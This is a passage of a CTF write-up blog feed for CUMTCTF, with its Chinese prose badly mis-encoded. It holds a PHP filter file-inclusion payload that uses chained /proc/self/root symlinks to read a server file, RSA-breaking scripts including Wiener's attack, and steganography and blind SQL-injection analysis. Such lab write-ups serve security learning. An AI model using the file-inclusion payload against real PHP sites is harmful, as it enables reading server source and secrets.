Againç±»ä¼¼ã€‚<br>/proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/ï¼Œ/proc/self/root/æ˜¯æŒ‡å‘/çš„ç¬¦å·é“¾æ¥ï¼Œæƒ³åˆ°è¿™é‡Œï¼Œç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡ã€‚</p><p>payload:</p><pre><code>f=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gj35a6hvxhj30vs089t92.jpg" alt=""></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="å¹¼å„¿å›­çš„å¯†ç å­¦"><a href="#å¹¼å„¿å›­çš„å¯†ç å­¦" class="headerlink" title="å¹¼å„¿å›­çš„å¯†ç å­¦"></a>å¹¼å„¿å›­çš„å¯†ç å­¦</h2><pre><code># e = 0x10001# n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f# c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d# Hint ï¼š google RSA</code></pre><p>å°†nè½¬ä¸º10è¿›åˆ¶å¾—    <code>n=106521084065274837947153338013414677016150003618052696631715598225251903811631</code><br>åœ¨factordb.comç½‘ç«™åˆ†è§£å¾—</p><pre><code>p=324350545929838254331191385863847627003q=328413456989577256301798468872388310877</code></pre><p>è„šæœ¬ï¼š</p><pre><code>import gmpy2import libnume = 0x10001n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302fc = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2dp=324350545929838254331191385863847627003q=328413456989577256301798468872388310877phi=(p-1)*(q-1)d=gmpy2.invert(e,phi)m=pow(c,d,n)print(libnum.n2s(m))</code></pre><h2 id="å°å­¦ç”Ÿçš„å¯†ç é¢˜"><a href="#å°å­¦ç”Ÿçš„å¯†ç é¢˜" class="headerlink" title="å°å­¦ç”Ÿçš„å¯†ç é¢˜"></a>å°å­¦ç”Ÿçš„å¯†ç é¢˜</h2><pre><code>from Secret import flagdef encode(ptext):dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;}&quot;) + 1)]m = [i for i in ptext]tmp = [];s = []for i in range(len(m)):    for j in range(len(dic)):        if m[i] == dic[j]:            tmp.append(j + 1)for i in tmp:    res = &quot;&quot;    if i &gt;= 8:        res += int(i/8)*&quot;8&quot;    if i%8 &gt;=4:        res += int(i%8/4)*&quot;4&quot;    if i%4 &gt;=2:        res += int(i%4/2)*&quot;2&quot;    if i%2 &gt;= 1:        res += int(i%2/1)*&quot;1&quot;    s.append(res + &quot;0&quot;)print (&quot;&quot;.join(s)[:-1])encode(flag)#2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841</code></pre><p>å‘ç°æ˜¯äº‘å½±å¯†ç ã€‚</p><pre><code>def de_code(c):dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;}&quot;) + 1)]flag = []c2 = [i for i in c.split(&quot;0&quot;)]for i in c2:    c3 = 0    for j in i:        c3 += int(j)    flag.append(dic[c3 - 1])return flags=de_code(&quot;2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841&quot;)print(s)</code></pre><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/lilongsy/article/details/108483119" target="_blank" rel="noopener">https://blog.csdn.net/lilongsy/article/details/108483119</a></p><h2 id="åˆä¸­ç”Ÿçš„å¯†ç é¢˜"><a href="#åˆä¸­ç”Ÿçš„å¯†ç é¢˜" class="headerlink" title="åˆä¸­ç”Ÿçš„å¯†ç é¢˜"></a>åˆä¸­ç”Ÿçš„å¯†ç é¢˜</h2><pre><code>from Crypto.Util.number import *flag = b&quot;CUMTCTF{***********}&quot;m = bytes_to_long(flag)p = getPrime(2048)q = getPrime(2048)n=p*qprint(&quot;n =&quot;)print(n)print(&quot;x =&quot;)print(p - q)e = 65537print(&quot;e =&quot;)print (e)enc = pow (m,e,n)print(&quot;c =&quot;)print (enc)# 848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397# -3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636# 65537# 500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609</code></pre><p><code>phi=(p-1)*(q-1)=pq-(p+q)+1</code>ï¼Œæ‰€ä»¥è¦æ„é€ p+qï¼Œé¢˜ç›®ç»™äº†p-qã€‚<br>æ‰€ä»¥ <code>(p+q)^2=(p-q)^2+4pq</code>å³å¯æ±‚å¾—p+qã€‚</p><pre><code>import gmpy2import libnumn=848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397x1=-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636e=65537c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609x2=x1**2+4*nx3=gmpy2.iroot(x2,2)x3=58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078phi=n-x3+1d=gmpy2.invert(e,phi)m=pow(c,d,n)print(libnum.n2s(m))</code></pre><h2 id="ç»´ä¹Ÿçº³çš„ç§˜å¯†"><a href="#ç»´ä¹Ÿçº³çš„ç§˜å¯†" class="headerlink" title="ç»´ä¹Ÿçº³çš„ç§˜å¯†"></a>ç»´ä¹Ÿçº³çš„ç§˜å¯†</h2><pre><code>import random, MillerRabin, Arithmeticfrom Crypto.Util.number import *from Secret import flagdef getPrimePair(bits=1024):assert bits%4==0p = MillerRabin.gen_prime(bits)q = MillerRabin.gen_prime_range(p+1, 2*p)return p,qdef generateKeys(nbits=2048):assert nbits%4==0p,q = getPrimePair(nbits//2)n = p*qphi = Arithmetic.totient(p, q)good_d = Falsewhile not good_d:    d = random.getrandbits(nbits//4)    if (Arithmetic.gcd(d,phi) == 1 and 36*pow(d,4) &lt; n):        good_d = Truee = Arithmetic.modInverse(d,phi)return e,n,dm = bytes_to_long(flag)e,n,d = generateKeys()print(e,n)c = pow (m,e,n)print (c)# 25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193,106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819# 15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160</code></pre><p>ä¸€çœ‹é¢˜ç›®å‘ç°eå’Œnéƒ½å¾ˆå¤§ï¼Œå†æ ¹æ®é¢˜ç›®åå­—ï¼ŒçŸ¥é“è¿™æ˜¯wienerâ€™s attack.</p><pre><code>import gmpy2import libnumdef transform(x,y):   #ä½¿ç”¨è¾—è½¬ç›¸å¤„å°†åˆ†æ•° x/y è½¬ä¸ºè¿åˆ†æ•°çš„å½¢å¼res=[]while y:    res.append(x//y)    x,y=y,x%yreturn resdef continued_fraction(sub_res):numerator,denominator=1,0for i in sub_res[::-1]:      #ä»sublistçš„åé¢å¾€å‰å¾ªç¯    denominator,numerator=numerator,i*numerator+denominatorreturn denominator,numerator   #å¾—åˆ°æ¸è¿›åˆ†æ•°çš„åˆ†æ¯å’Œåˆ†å­ï¼Œå¹¶è¿”å›#æ±‚è§£æ¯ä¸ªæ¸è¿›åˆ†æ•°def sub_fraction(x,y):res=transform(x,y)res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res)))))  #å°†è¿åˆ†æ•°çš„ç»“æœé€ä¸€æˆªå–ä»¥æ±‚æ¸è¿›åˆ†æ•°return resdef get_pq(a,b,c):  #ç”±p+qå’Œpqçš„å€¼é€šè¿‡ç»´è¾¾å®šç†æ¥æ±‚è§£på’Œqpar=gmpy2.isqrt(b*b-4*a*c)   #ç”±ä¸Šè¿°å¯å¾—ï¼Œå¼€æ ¹å·ä¸€å®šæ˜¯æ•´æ•°ï¼Œå› ä¸ºæœ‰è§£x1,x2=(-b+par)//(2*a),(-b-par)//(2*a)return x1,x2def wienerAttack(e,n):for (d,k) in sub_fraction(e,n):  #ç”¨ä¸€ä¸ªforå¾ªç¯æ¥æ³¨æ„è¯•æ¢e/nçš„è¿ç»­å‡½æ•°çš„æ¸è¿›åˆ†æ•°ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æ¸è¿›åˆ†æ•°    if k==0:                     #å¯èƒ½ä¼šå‡ºç°è¿åˆ†æ•°çš„ç¬¬ä¸€ä¸ªä¸º0çš„æƒ…å†µï¼Œæ’é™¤        continue    if (e*d-1)%k!=0:             #ed=1 (mod Ï†(n)) å› æ­¤å¦‚æœæ‰¾åˆ°äº†dçš„è¯ï¼Œ(ed-1)ä¼šæ•´é™¤Ï†(n),ä¹Ÿå°±æ˜¯å­˜åœ¨kä½¿å¾—(e*d-1)//k=Ï†(n)        continue    phi=(e*d-1)//k               #è¿™ä¸ªç»“æœå°±æ˜¯ Ï†(n)    px,qy=get_pq(1,n-phi+1,n)    if px*qy==n:        p,q=abs(int(px)),abs(int(qy))     #å¯èƒ½ä¼šå¾—åˆ°ä¸¤ä¸ªè´Ÿæ•°ï¼Œè´Ÿè´Ÿå¾—æ­£æœªå°ä¸ä¼šå‡ºç°        d=gmpy2.invert(e,(p-1)*(q-1))     #æ±‚ed=1 (mod  Ï†(n))çš„ç»“æœï¼Œä¹Ÿå°±æ˜¯eå…³äº Ï†(n)çš„ä¹˜æ³•é€†å…ƒd        return dprint(&quot;è¯¥æ–¹æ³•ä¸é€‚ç”¨&quot;)e = 25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193n = 106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819d=wienerAttack(e,n)c=15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160m=pow(c,d,n)print(libnum.n2s(m))</code></pre><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="çœŸÂ·ç­¾åˆ°é¢˜"><a href="#çœŸÂ·ç­¾åˆ°é¢˜" class="headerlink" title="çœŸÂ·ç­¾åˆ°é¢˜"></a>çœŸÂ·ç­¾åˆ°é¢˜</h2><p>ç”¨vimæ‰“å¼€åœ¨æ–‡ä»¶æœ«å°¾å‘ç°<code>RVdPVkVWSHtVMWlwX2twX3V3ZWVndXVodzExYSF9IA==</code><br>base64ç¼–ç ã€‚<br>è§£ç å¾—åˆ° <code>EWOVEVH{U1ip_kp_uweeguuhw11a!}</code> å‘ç°æ˜¯å‡¯æ’’å¯†ç ï¼Œå‘å‰ç§»åŠ¨ä¸¤ä½å¾—åˆ°flagã€‚</p><h2 id="èƒ½çœ‹åˆ°æˆ‘å—"><a href="#èƒ½çœ‹åˆ°æˆ‘å—" class="headerlink" title="èƒ½çœ‹åˆ°æˆ‘å—"></a>èƒ½çœ‹åˆ°æˆ‘å—</h2><p>ç»è¿‡çˆ†ç ´ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç æ˜¯ <code>1433223233</code>ï¼Œè§£å‹å¾—åˆ°ä¸€å¼ åä¸ºtwins.pngçš„å›¾ç‰‡ã€‚ç”¨binwalkåˆ†æå‘ç°é‡Œé¢æœ‰ä¸¤ä¸ªPNGå›¾ç‰‡ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gj36rgc8pdj30gc05nacv.jpg" alt=""><br>ä½¿ç”¨foremostå‘½ä»¤åˆ†ç¦»ã€‚<br>ä¸¤å¼ å›¾ç‰‡çš„è¯æˆ‘æ‰€çŸ¥é“çš„å°±æ˜¯ç”¨stegsolveåˆå¹¶ä¸¤å¼ å›¾ç‰‡æˆ–è€…ç›²æ°´å°ã€‚<br>å‰ä¸€ä¸ªæ²¡æœ‰æ˜æ˜¾ç‰¹å¾ï¼Œæ‰€ä»¥ä½¿ç”¨åé¢ä¸€ä¸ªæ–¹æ³•ã€‚</p><pre><code>python3 bwmforpy3.py decode 00000000.png 00001333.png solve.png</code></pre><p>è·å¾—flagã€‚</p><p>å‚è€ƒï¼š<a href="https://github.com/chishaxie/BlindWaterMark#blindwatermark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark#blindwatermark</a></p><h2 id="å…”å…”é‚£ä¹ˆå¯çˆ±"><a href="#å…”å…”é‚£ä¹ˆå¯çˆ±" class="headerlink" title="å…”å…”é‚£ä¹ˆå¯çˆ±"></a>å…”å…”é‚£ä¹ˆå¯çˆ±</h2><p>å…ˆä»¥ä¸ºæ˜¯rabbitå¯†ç æ²¡è§£å‡ºæ¥ã€‚åé¢æ ¹æ®hintçŸ¥é“æ˜¯æ–æ³¢é‚£å¥‘æ•°åˆ—ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gj378xe8qlj30sa028mxe.jpg" alt=""><br>æ ¹æ®æ•°åˆ—ä»¥åŠflagæ–‡ä»¶ä¸­å­—ç¬¦å¯¹åº”å­—æ¯çš„ä½ç½®ï¼Œå¯ä»¥è·å¾—flagã€‚</p><pre><code>CUMTCTF{Are_rabbits_cute?}</code></pre><p>è¿™é¢˜æˆ‘æ˜¯æ ¹æ®sublime textè½¯ä»¶é€‰å–å­—ç¬¦æ¥æ¥æ‰¾çš„ï¼Œä¹Ÿèƒ½ä½¿ç”¨è„šæœ¬è·‘å‡ºflagã€‚è„šæœ¬è‡ªå¯»æŸ¥æ‰¾ã€‚</p><h2 id="åˆ«åšé¢˜äº†å¬æ­Œå§"><a href="#åˆ«åšé¢˜äº†å¬æ­Œå§" class="headerlink" title="åˆ«åšé¢˜äº†å¬æ­Œå§"></a>åˆ«åšé¢˜äº†å¬æ­Œå§</h2><p>æ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªmp3æ–‡ä»¶ï¼Œè€Œä¸”é¢˜ç›®è¯´é—®å°±æ˜¯cumtï¼Œæƒ³åˆ°æ˜¯éŸ³é¢‘éšå†™åˆ©ç”¨mp3stegoå·¥å…·æ±‚è§£ã€‚</p><pre><code>Decode.exe -X -P cumt anheqiao.mp3</code></pre><p>å¾—åˆ°anheqiao.mp3.txtï¼Œæ‰“å¼€å‘ç°å…¨æ˜¯ç©ºç™½ï¼Œä½†æ˜¯å‘ç°ç¡®å®æœ‰å†…å®¹ï¼Œæˆ‘ä»¥ä¸ºå’Œä¹‹å‰é’“é±¼åŸæ¯çš„é‚£é¢˜ä¸€æ ·æ˜¯whitespaceç¼–ç ï¼Œä½†è§£å‡ºæ¥å‘ç°éƒ½æ˜¯ä¹±ç ï¼Œä½¿ç”¨sublime textæ‰“å¼€å‘ç°éƒ½æ˜¯.å’Œâ€”â€”,æ‰€ä»¥æƒ³åˆ°æ‘©æ–¯ç”µç ï¼Œç©ºæ ¼æ˜¯.ï¼Œtabæ˜¯-ï¼Œæ¢è¡Œç¬¦æ˜¯/ï¼Œæ›¿æ¢ä¸€ä¸‹è¿›è¡Œæ‘©æ–¯ç”µç è§£å¯†æœ€ååŒ…ä¸ŠCUMTCTF{}è·å¾—flagã€‚</p><h2 id="å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾"><a href="#å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾" class="headerlink" title="å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾"></a>å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gj37u7j8zfj316u0g7q5c.jpg" alt=""><br>å‘ç°éƒ½æ˜¯ç›²æ³¨çš„è¯­å¥ï¼Œflagå½¢å¼æ˜¯CUMTCTFï¼Œäºæ˜¯å¯»æ‰¾ç¬¦åˆæ¡ä»¶çš„ç›²æ³¨è¯­å¥ã€‚<br>ç»è¿‡åˆ†æå¯çŸ¥ï¼Œå½“ifä¸ºçœŸæ—¶è¿”å› <code>Hello,L1dng wants a girlfriend</code>ï¼Œä¸ºå‡æ—¶è¿”å› <code>You should be stronger</code>ã€‚<br>ç…§è¿™ä¸ªæ€è·¯å¯»æ‰¾ifä¸ºå‡æ—¶çš„æœ€å°å€¼ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gj380b2uy0j314w058mxb.jpg" alt=""><br>ç¬¬ä¸€ä¸ªå­—ç¬¦&gt;67æ—¶ifä¸ºå‡ï¼Œè€Œä¸”67æ˜¯æœ€å°çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIä¸º67å³Cã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;Webç­¾åˆ°&quot;&gt;&lt;a href=&quot;#Webç­¾åˆ°&quot; class=&quot;headerlink&quot; title=&quot;Webç­¾åˆ°&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="web" scheme="https://devildragons.github.io/categories/web/"/>
    
    
      <category term="cumt" scheme="https://devildragons.github.io/tags/cumt/"/>
    
  </entry>
  
  <entry>
    <title>CUMTOJ</title>
    <link href="https://devildragons.github.io/2020/07/07/CUMTOJ/"/>
    <id>https://devildragons.github.io/2020/07/07/CUMTOJ/</id>
    <published>2020-07-06T16:00:00.000Z</published>
    <updated>2020-07-19T12:17:44.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CUMTOJ"><a href="#CUMTOJ" class="headerlink" title="CUMTOJ"></a>CUMTOJ</h1><h2 id="è´¢åŠ¡ç®¡ç†"><a href="#è´¢åŠ¡ç®¡ç†" class="headerlink" title="è´¢åŠ¡ç®¡ç†"></a>è´¢åŠ¡ç®¡ç†</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi85lewybj30xx0famy9.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi866v4rlj30qg0fmq3b.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi7z2tu80j30mj0cmaar.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggi80g8i2lj30km0ca74t.jpg" alt=""></p><h2 id="å¤–å¸å…‘æ¢"><a href="#å¤–å¸å…‘æ¢" class="headerlink" title="å¤–å¸å…‘æ¢"></a>å¤–å¸å…‘æ¢</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi86uk8x3j31440fntab.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi87iu9jrj30q208mq33.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi82k54sdj30m60gr0tl.jpg" alt=""></p><h2 id="æ‘†ç§¯æœ¨"><a href="#æ‘†ç§¯æœ¨" class="headerlink" title="æ‘†ç§¯æœ¨"></a>æ‘†ç§¯æœ¨</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi8456ygdj31460mln00.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi84sl9bzj30mv09aaa5.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggwjp3lsmdj30hc0hd0td.jpg" alt=""></p><h2 id="å½“æ€»ç»Ÿ"><a href="#å½“æ€»ç»Ÿ" class="headerlink" title="å½“æ€»ç»Ÿ"></a>å½“æ€»ç»Ÿ</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi88iz9zxj314k0fzmyx.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi891kbggj30qz08b74d.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi89u0ioyj30lp0l8q42.jpg" alt=""></p><h2 id="æ„å»ºçŸ©é˜µ"><a href="#æ„å»ºçŸ©é˜µ" class="headerlink" title="æ„å»ºçŸ©é˜µ"></a>æ„å»ºçŸ©é˜µ</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8awmd1xj311g0fkjsk.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi8bitz0dj30sx0bqt8x.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi8c6tnbcj30mq0i10tn.jpg" alt=""></p><h2 id="æœŸæœ«æˆç»©"><a href="#æœŸæœ«æˆç»©" class="headerlink" title="æœŸæœ«æˆç»©"></a>æœŸæœ«æˆç»©</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi8d1imp4j314i0h9q56.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8dgfl8fj30t909hq32.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi8e6d1vbj30lv0hrq41.jpg" alt=""></p><h2 id="å¥‡æ€ªçš„ä¿¡"><a href="#å¥‡æ€ªçš„ä¿¡" class="headerlink" title="å¥‡æ€ªçš„ä¿¡"></a>å¥‡æ€ªçš„ä¿¡</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi8ffxrp2j30ys0fet9y.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi8fm52v3j30xh0a6dg0.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8fvtt6rj30mp0gdmxx.jpg" alt=""></p><h2 id="çŸ³å¤´å‰ªå­å¸ƒ"><a href="#çŸ³å¤´å‰ªå­å¸ƒ" class="headerlink" title="çŸ³å¤´å‰ªå­å¸ƒ"></a>çŸ³å¤´å‰ªå­å¸ƒ</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi8j01wimj30wb0hnmyu.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi8j712nvj30ru0fhmxg.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8jexpzyj30od0l1jsm.jpg" alt=""></p><h2 id="ç”µæ¢¯å‡é™"><a href="#ç”µæ¢¯å‡é™" class="headerlink" title="ç”µæ¢¯å‡é™"></a>ç”µæ¢¯å‡é™</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8kvz4czj30xi0fptaa.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi8l3aex5j30tw0a574f.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi8lanjkpj30mx0h53ze.jpg" alt=""></p><h2 id="æ¶ææŒ‡æ•°"><a href="#æ¶ææŒ‡æ•°" class="headerlink" title="æ¶ææŒ‡æ•°"></a>æ¶ææŒ‡æ•°</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8midjcuj31690gr762.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi8moz827j30u00a6mxb.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8mvmqelj30oe0hq3zi.jpg" alt=""></p><h2 id="æŒ‚ç›æ°´"><a href="#æŒ‚ç›æ°´" class="headerlink" title="æŒ‚ç›æ°´"></a>æŒ‚ç›æ°´</h2><p><img 